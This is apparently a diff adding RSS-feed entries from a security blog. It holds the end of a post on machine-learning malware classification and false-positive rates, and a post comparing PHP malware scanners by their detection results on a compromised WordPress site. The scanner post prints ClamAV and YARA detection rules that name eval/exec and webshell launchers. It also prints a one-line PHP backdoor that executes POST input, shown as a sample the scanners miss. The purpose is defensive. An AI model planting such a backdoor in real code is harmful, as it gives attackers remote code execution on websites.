+&lt;h2 id=&#34;reuse-the-algorithm&#34;&gt;Reuse the algorithm&lt;/h2&gt;
+
+&lt;p&gt;So now we want to reuse this algorithms for detection, we can just save the object and the feature list :&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;joblib.dump(algorithms[winner], &#39;classifier/classifier.pkl&#39;)
+open(&#39;classifier/features.pkl&#39;, &#39;w&#39;).write(pickle.dumps(features))
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I have then implemented a &lt;a href=&#34;https://github.com/Te-k/malware-classification/blob/master/checkpe.py&#34;&gt;simple tool&lt;/a&gt; which load the feature list and the classifier, extract the PE feature and predict if a binary is malicious or not:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;&amp;gt; python2 checkpe.py ~/virusshare/VirusShare_000b296200f7b8fffbc584f3eac864b2
+The file VirusShare_000b296200f7b8fffbc584f3eac864b2 is malicious
+&amp;gt; python2 checkpe.py ~/legitimate/explorer.exe
+The file explorer.exe is legitimate
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;As I like the new &lt;a href=&#34;https://manalyzer.org/&#34;&gt;Manalyzer&lt;/a&gt; platform, I have also developed &lt;a href=&#34;https://github.com/Te-k/malware-classification/blob/master/checkmanalyzer.py&#34;&gt;a script&lt;/a&gt; which download the PE properties and predict if the binary is legitimate of not:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;&amp;gt;python2 checkmanalyzer.py https://manalyzer.org/report/a9ea61c5ae7eab02c63955336a7c7efe
+The file a9ea61c5ae7eab02c63955336a7c7efe is legitimate
+&amp;gt; python2 checkmanalyzer.py https://manalyzer.org/report/9c5c27494c28ed0b14853b346b113145
+The file 9c5c27494c28ed0b14853b346b113145 is malicious
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;why-it-s-not-enough&#34;&gt;Why it&amp;rsquo;s not enough?&lt;/h2&gt;
+
+&lt;p&gt;First, a bit of vocabulary for measuring IDS accuracy (taken from &lt;a href=&#34;https://en.wikipedia.org/wiki/Sensitivity_and_specificity&#34;&gt;Wikipedia&lt;/a&gt;):&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Sensitivity&lt;/strong&gt; : the proportion of positives identified as such (or true positive rate)&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Specificity&lt;/strong&gt; : the proportion of negatives correctly identified as such (or true negative)&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;False Positive Rate&lt;/strong&gt; (FPR) : the proportion of events badly identified as positive over the total number of negatives&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;False Negative Rate&lt;/strong&gt; (FNR) : the proportion of events badly identified as negative over the total number of positives&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;So why 99.35% is not enough?&lt;/p&gt;
+
+&lt;p&gt;Because you can&amp;rsquo;t just consider the sensitivity/specificity of the algorithm, you have to consider the malicious over legitimate traffic ratio to understand how many alerts will be generated by the IDS. And this ratio is extremely low.&lt;/p&gt;
+
+&lt;p&gt;Let&amp;rsquo;s consider the you have 1 malicious event every 10 000 event (it&amp;rsquo;s a really high ratio) and 1 000 000 events per day, you will have :&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;100 malicious events, 99 identified by the tool and 1 false negative (0.83% FNR but let&amp;rsquo;s consider 1% here)&lt;/li&gt;
+&lt;li&gt;999 900 legitimate events, around 6499 identified as malicious (0.65% FPR)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;So in the end, &lt;strong&gt;the analyst would received 6598 alerts per day with only 99 true positive in it (1.5%)&lt;/strong&gt;. Your IDS is useless here. (Out of curiosity, the same problem applies when &lt;a href=&#34;http://www.jaddo.fr/2016/06/19/et-mes-fesses-elles-sont-roses-mes-fesses/&#34;&gt;detecting cancer at large scale&lt;/a&gt; (in French))&lt;/p&gt;
+
+&lt;p&gt;If we take our example, a standard Windows 7 install has around 15000 binary files (it seems to be very different depending on the version, but let&amp;rsquo;s say 15000), which means that in average 97 files would be detected incorrectly as malicious. And that&amp;rsquo;s a bad antivirus.&lt;/p&gt;
+
+&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
+
+&lt;p&gt;So it was a fun example of machine learning utilization. I like how Pandas and Scikit make machine learning easy to use in python (and Scikit is really well explained and documented!). I was really surprised to have such good results without any effort for configuring the algorithm specifically for this context, and it shows that the Adobe tool is not as good as I thought.&lt;/p&gt;
+
+&lt;p&gt;Still, it is interesting to remind the IDS problem and show it concretely (just after self-congratulation for such a good sensitivity :).&lt;/p&gt;
+
+&lt;p&gt;If you have any question, comment or idea to continue playing with this dataset, let me know on &lt;a href=&#34;https://twitter.com/tenacioustek&#34;&gt;Twitter&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Here are some nice references on this topic:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;http://pandas.pydata.org/pandas-docs/stable/10min.html&#34;&gt;Learning Pandas in 10 minutes&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://blog.socialcops.com/engineering/machine-learning-python&#34;&gt;Would You Survive the Titanic? A Guide to Machine Learning in Python&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://scikit-learn.org/stable/index.html&#34;&gt;Scikit Learn&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Adéu!&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;Edit 21/07/16: improved the dataset with more legitimate binaries. Updated the results&lt;/em&gt;
+&lt;em&gt;Edit 02/08/16: explained why it&amp;rsquo;s not enough&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;This article was written mainly while listening Glenn Gould &lt;a href=&#34;https://www.youtube.com/watch?v=Ah392lnFHxM&#34;&gt;Goldberg Variations (1955)&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Comparison of php scanners</title>
+      <link>https://www.randhome.io/blog/2016/05/14/comparison-of-php-scanners/</link>
+      <pubDate>Sat, 14 May 2016 17:44:19 +0200</pubDate>
+      
+      <guid>https://www.randhome.io/blog/2016/05/14/comparison-of-php-scanners/</guid>
+      <description>
+
+&lt;p&gt;Hi there!&lt;/p&gt;
+
+&lt;p&gt;I have recently looked different compromised websites on github, mostly using outdated Wordpress/Joomla/Drupal versions. In these cases, I often have to go through many different files to find the malicious one, whether added on the website or added to legitimate files. Here is a short summary of the different tools to detect them.&lt;/p&gt;
+
+&lt;h2 id=&#34;clamav&#34;&gt;ClamAV&lt;/h2&gt;
+
+&lt;p&gt;&lt;center&gt;&lt;img src=&#34;https://www.randhome.io/media/clamav.png&#34; alt=&#34;clamav logo&#34; /&gt;&lt;/center&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://www.clamav.net/&#34;&gt;ClamAV&lt;/a&gt; is an open-source antivirus developed for different platform, but also one of the seldom antivirus used on Linux. It has a complex signature format with many open signature provided by the community (more than 3 700 000 according to wikipedia). And the good news, is that &lt;a href=&#34;http://blog.clamav.net/2015/06/clamav-099b-meets-yara.html&#34;&gt;it supports Yara&lt;/a&gt; since last year!&lt;/p&gt;
+
+&lt;p&gt;It is possible to convert some of the clamav signature to Yara thanks to &lt;a href=&#34;https://github.com/Te-k/analyst-scripts/blob/master/tools/clamav_to_yara.py&#34;&gt;the nice script&lt;/a&gt; published in the Malware Analyst Cookbook by Michael Ligh, Steven Adair, Blake Hartstein, Matthew Richard :&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sigtool -u main.cvd
+python clamav_to_yara.py -f main.ndb -o main.yara
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Clamav has several signatures related to php backdoors, like this nice one in daily.ldb (logical signatures in .ldb files are not converted by the previous script):&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;Php.Malware.Mailbot-45;Engine:51-255,Target:7;0&amp;amp;1;6563686F207068705F6F732E{-35}275D2830393837363534333231292E;6563686F207068705F6F732E{-35}275D2832323232323232323232292E
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Shortly explained, this signature is a logical clamav signature with a format NAME;INFOS;CONDITION;PATTERN1;PATTERN2&amp;hellip;&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;The infos contains information on the clamav engine needed to read this signature and the type of target file (7 is ASCII file)&lt;/li&gt;
+&lt;li&gt;The condition here is &lt;em&gt;0&amp;amp;1&lt;/em&gt; so both patterns should be present for the signature to match.&lt;/li&gt;
+&lt;li&gt;Patterns are in hexadecimal format and {-XX} means that at most XX characters are not considered in the pattern. Apparently signatures on ascii files are case insensitive.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;So we can convert this signature to the following yara signature&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;rule php_malware_mailbot_45 {
+    strings:
+        $a = /echo php_os\..{,35}&#39;\]\(0987654321\)\./ nocase
+        $b = /echo php_os\..{,35}&#39;\]\(2222222222\)\./ nocase
+
+    condition:
+        all of them
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;linux-malware-detect&#34;&gt;linux-malware-detect&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://github.com/rfxn/linux-malware-detect&#34;&gt;Linux Malware Detect&lt;/a&gt; uses signatures extracted from Clamav and other tools to detect malware, mainly based on md5 hashes of malicious files (and thus not very reliable). The tool was not updated since 2013 apparently, and according to the documentation it contained 8,908 MD5 / 1,914 signatures.&lt;/p&gt;
+
+&lt;h2 id=&#34;php-malware-finder&#34;&gt;php-malware-finder&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://github.com/nbs-system/php-malware-finder&#34;&gt;php-malware-finder&lt;/a&gt; is a tool developed by &lt;a href=&#34;https://www.nbs-system.com/&#34;&gt;NBS System&lt;/a&gt; based on &lt;a href=&#34;https://github.com/nbs-system/php-malware-finder/blob/master/php-malware-finder/phpmalwarefinder&#34;&gt;a simple shell script&lt;/a&gt; which rely mainly on Yara signatures to detect malicious files.&lt;/p&gt;
+
+&lt;p&gt;This tool has some &lt;a href=&#34;https://github.com/nbs-system/php-malware-finder/blob/master/php-malware-finder/php.yar&#34;&gt;nice rules&lt;/a&gt; for instance for detecting obfuscated php:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;rule ObfuscatedPhp
+{
+    strings:
+        $eval = /(&amp;lt;\?php|[;{}])[ \t]*@?(eval|preg_replace|system|assert|passthru|(pcntl_)?exec|win_shell_execute|call_user_func(_array)?)\s*\(/ nocase  // ;eval( &amp;lt;- this is dodgy
+        $b374k = &amp;quot;&#39;ev&#39;.&#39;al&#39;&amp;quot;
+        $align = /(\$\w+=[^;]*)*;\$\w+=@?\$\w+\(/  //b374k
+        $weevely3 = /\$\w=\$[a-zA-Z]\(&#39;&#39;,\$\w\);\$\w\(\);/  // weevely3 launcher
+        $c99_launcher = /;\$\w+\(\$\w+(,\s?\$\w+)+\);/  // http://bartblaze.blogspot.fr/2015/03/c99shell-not-dead.html
+        $variable_variable = /\${\$[0-9a-zA-z]+}/
+        $too_many_chr = /(chr\([\d]+\)\.){5}/  // concatenation of more than two `chr()`
+        $concat = /(\$[^\n\r]+\.){5}/  // concatenation of more than 5 words
+        $var_as_func = /\$_(GET|POST|COOKIE|REQUEST)\s*\[[^\]]+\]\s*\(/
+        $gif = /^GIF89/
+    condition:
+        any of them and not IsWhitelisted
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The problem is that there is only generic methods (nothing designed for specific sample) so it misses a lot of samples (many basic webshells for instance), and some methods (like Dodgy php) are generating a lot of false positive.&lt;/p&gt;
+
+&lt;h2 id=&#34;php-malware-scanner&#34;&gt;php-malware-scanner&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://github.com/planet-work/php-malware-scanner&#34;&gt;php-malware-scanner&lt;/a&gt; has been developed by the french company &lt;a href=&#34;https://www.planet-work.com/&#34;&gt;planet-work&lt;/a&gt; likely to clean their own hosted websites and the result is pretty good.&lt;/p&gt;
+
+&lt;p&gt;Their idea was too make a score with different parameters often identified in malicious php files, here is a short list as example :&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;MANY_GLOBALS : Contains $GLOBALS many times (+20)&lt;/li&gt;
+&lt;li&gt;MD5_VAR : contains a MD5 variable (+2)&lt;/li&gt;
+&lt;li&gt;VERY_LONG_LINE_EARLY : the file has a first ver long line (+10)&lt;/li&gt;
+&lt;li&gt;HAS_BASE64DECODE : has a function base64_decode() or str_rot13()&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;This approach is nice, but the problem is that the code is real mess with a long list of if/else. Have a look:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;if re.compile(&#39;.*=\s*&amp;quot;http://[a-z0-9].*&amp;quot;;&#39;).match(l) or re.compile(&amp;quot;.*=\s*&#39;http:.*&#39;;&amp;quot;).match(l) :
+    if not &#39;simpletest.org&#39; in l and not &#39;facebook.com&#39; in l:
+	has_var_http = True
+if has_var_http and (&#39;curl_exec&#39; in l or &#39;xxxxxxxxxx&#39; in l) and line_num &amp;lt; 20:
+    score.append((&#39;CURL_HTTP&#39; ,&#39;&#39;))
+if line_num &amp;lt; line_early and &#39;call_user_func&#39; in l:
+    score.append((&#39;HAS_CALL_FUNC_EARLY&#39;,&#39;line %i&#39; % line_num))
+if &#39;agent&#39; in l.lower() and &#39;google&#39; in l.lower():
+    score.append((&#39;UA_GOOGLE&#39;,&#39;&#39;))
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;And even though they have added few signature directly in the code (hurrr), there are really few of them and the tool is often missing easy to detect samples. The following basic shell added to a legitimate php file would go undetected for instance:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php @preg_replace(&#39;/(.*)/e&#39;, @$_POST[&#39;abcdef&#39;], &#39;&#39;);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Here is an example of result by this tool (you should add a &amp;ndash;minscore option, 10 seems to be a good value):&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;{
+        &amp;quot;score&amp;quot;: 15,
+        &amp;quot;filename&amp;quot;: &amp;quot;/home/etienne/perso/fun/new-caffe/./public/wp-includes/images/crystal/epsg8vpeff.php&amp;quot;,
+        &amp;quot;cleanup&amp;quot;: false,
+        &amp;quot;details&amp;quot;: [
+            {
+                &amp;quot;score&amp;quot;: 5,
+                &amp;quot;details&amp;quot;: &amp;quot;&amp;quot;,
+                &amp;quot;rule&amp;quot;: &amp;quot;UA_GOOGLE&amp;quot;,
+                &amp;quot;description&amp;quot;: &amp;quot;V\u00e9rifie le User-Agent contre Google&amp;quot;
+            },
+            {
+                &amp;quot;score&amp;quot;: 10,
+                &amp;quot;details&amp;quot;: &amp;quot;line 1&amp;quot;,
+                &amp;quot;rule&amp;quot;: &amp;quot;VERY_LONG_LINE_EARLY&amp;quot;,
+                &amp;quot;description&amp;quot;: &amp;quot;Contient une ligne de plus de 3000 caract\u00e8res en d\u00e9but de fichier&amp;quot;
+            },
+            {
+                &amp;quot;score&amp;quot;: 0,
+                &amp;quot;details&amp;quot;: &amp;quot;1 lines&amp;quot;,
+                &amp;quot;rule&amp;quot;: &amp;quot;FEW_LINES&amp;quot;,
+                &amp;quot;description&amp;quot;: &amp;quot;Contient peu de lignes&amp;quot;
+            }
+        ],
+        &amp;quot;mtime&amp;quot;: 1463402470.307976,
+        &amp;quot;ctime&amp;quot;: 1463402470.307976
+    }
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;comparison&#34;&gt;Comparison&lt;/h2&gt;
+
+&lt;p&gt;I have tested these tools on a wordpress website which has 38 different malicious files (mainly simple backdoors but also mass mailers or other malicious files).&lt;/p&gt;
+
+&lt;p&gt;&lt;center&gt;&lt;img src=&#34;https://www.randhome.io/media/doctor1.jpg&#34; alt=&#34;Doctor&#34; /&gt;&lt;/center&gt;&lt;/p&gt;
+
+&lt;p&gt;Here are the results:&lt;/p&gt;
+
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Tool&lt;/th&gt;
+&lt;th align=&#34;center&#34;&gt;True Positive&lt;/th&gt;
+&lt;th align=&#34;right&#34;&gt;False Positive&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;Linux Malware Detect&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;4 / 39&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;0&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;ClamAV (default)&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;4 / 39&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;0&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;php-malware-finder&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;28 / 39&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;126&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;php-malware-scanner (minscore 10)&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;10 / 39&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;0&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;So nothing is perfect, likely something to do to improve these results.&lt;/p&gt;
+
+&lt;p&gt;Hasta Luego!&lt;/p&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
